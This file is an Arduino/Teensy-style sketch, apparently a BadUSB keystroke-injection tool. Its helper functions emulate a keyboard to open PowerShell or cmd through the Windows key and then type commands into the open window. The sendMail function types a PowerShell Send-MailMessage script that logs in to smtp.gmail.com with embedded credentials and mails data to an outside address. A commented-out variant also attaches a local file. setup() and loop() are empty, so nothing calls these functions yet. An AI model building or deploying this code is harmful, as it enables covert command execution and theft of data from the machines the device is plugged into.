void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:

}

void sendMail(String body,String SmtpUser,String smtpPassword,String MailTo,String MailFrom, String MailSubject, String FilePath){
  MailSubject= "Test using $SmtpServer" ;
 // String script= "$Body = \""+SmtpUser+"\" \n $SmtpServer = \'smtp.gmail.com\' \n $SmtpUser = \'"+SmtpUser+"\' \n $smtpPassword = \'"+smtpPassword+"\' \n $MailtTo = \'"+MailTo+"\' \n $MailFrom = \'"+MailFrom+"\' \n $MailSubject = \"Test using $SmtpServer\" \n $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) \n Send-MailMessage -To \"$MailtTo\" -from \"$MailFrom\" -Subject $MailSubject -Body \"$Body\"  -Attachments \""+FilePath+"\" -SmtpServer $SmtpServer -UseSsl -Credential $Credentials";
String script= "$Body = \""+body+"\" \n $SmtpServer = \'smtp.gmail.com\' \n $SmtpUser = \'"+SmtpUser+"\' \n $smtpPassword = \'"+smtpPassword+"\' \n $MailtTo = \'"+MailTo+"\' \n $MailFrom = \'"+MailFrom+"\' \n $MailSubject = \""+MailSubject+"\" \n $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) \n Send-MailMessage -To \"$MailtTo\" -from \"$MailFrom\" -Subject $MailSubject -Body \"$Body\" -SmtpServer $SmtpServer -UseSsl -Credential $Credentials";
    writeCMD(script);
}


void initialise(){
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
}


void writeCMD(String cmd){
    delay(100);
    Keyboard.print(cmd);  
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(KEY_ENTER);  
    Keyboard.send_now();
    delay(100);

    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
}

void openPowerShell(){
   delay(1000);
    
    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);

  
    Keyboard.println("PowerShell");  
    Keyboard.send_now();
    delay(100);


     Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
}

void opencmd(){

    delay(1000);
    
    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);

  
    Keyboard.print("cmd");  
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(KEY_ENTER);  
    Keyboard.send_now();
    delay(100);

     Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
  
}
